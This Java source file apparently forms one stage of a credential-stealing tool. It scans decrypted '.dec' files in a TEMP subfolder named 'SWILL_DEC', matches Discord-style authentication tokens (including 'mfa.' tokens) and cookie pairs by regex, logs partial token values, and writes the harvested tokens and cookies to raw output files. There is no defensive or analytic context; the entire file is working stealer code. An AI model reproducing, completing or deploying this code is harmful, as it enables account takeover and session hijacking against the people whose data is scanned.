import java.io.*;
import java.nio.file.*;
import java.util.regex.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class TokenExtractor {
    private static final String DEC_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final String OUTPUT_DIR = DEC_DIR + "\\extracted";
    private static final String TOKEN_PATTERN = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}";
    
    public static void main(String[] args) {
        log("TokenExtractor started");
        new File(OUTPUT_DIR).mkdirs();
        log("Output directory: " + OUTPUT_DIR);
        extractAll();
        log("TokenExtractor finished. Will exit. Run again to scan new files.");
    }
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Extractor][" + timestamp + "] " + msg);
    }
    
    private static void extractAll() {
        StringBuilder tokens = new StringBuilder();
        StringBuilder cookies = new StringBuilder();
        
        File decFolder = new File(DEC_DIR);
        if (!decFolder.exists()) {
            log("Decrypted files directory not found: " + DEC_DIR);
            return;
        }
        
        File[] decFiles = decFolder.listFiles((d, n) -> n.endsWith(".dec"));
        if (decFiles == null || decFiles.length == 0) {
            log("No .dec files found in " + DEC_DIR);
            return;
        }
        
        log("Found " + decFiles.length + " .dec file(s) to process");
        
        int tokenCount = 0;
        int cookieCount = 0;
        
        for (File f : decFiles) {
            try {
                String content = new String(Files.readAllBytes(f.toPath()));
                log("Processing: " + f.getName() + " (" + content.length() + " bytes)");
                
                Pattern p = Pattern.compile(TOKEN_PATTERN);
                Matcher m = p.matcher(content);
                while (m.find()) {
                    tokens.append(m.group()).append("\n");
                    tokenCount++;
                    log("Found token in " + f.getName() + ": " + m.group().substring(0, Math.min(30, m.group().length())) + "...");
                }
                
                Pattern cookieP = Pattern.compile("([\\w_]+)=([^;\\n]+)");
                Matcher cookieM = cookieP.matcher(content);
                while (cookieM.find()) {
                    cookies.append(cookieM.group(1)).append("=").append(cookieM.group(2)).append("\n");
                    cookieCount++;
                }
                log("Extracted " + tokenCount + " tokens and " + cookieCount + " cookies so far");
            } catch (Exception e) {
                log("Error processing " + f.getName() + ": " + e.getMessage());
            }
        }
        
        try {
            if (tokens.length() > 0) {
                Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), tokens.toString().getBytes());
                log("Saved " + tokenCount + " tokens to " + OUTPUT_DIR + "\\tokens_raw.txt");
            } else {
                log("No tokens found");
            }
            
            if (cookies.length() > 0) {
                Files.write(Paths.get(OUTPUT_DIR + "\\cookies_raw.txt"), cookies.toString().getBytes());
                log("Saved " + cookieCount + " cookies to " + OUTPUT_DIR + "\\cookies_raw.txt");
            } else {
                log("No cookies found");
            }
        } catch (Exception e) {
            log("Error saving output files: " + e.getMessage());
        }
    }
}
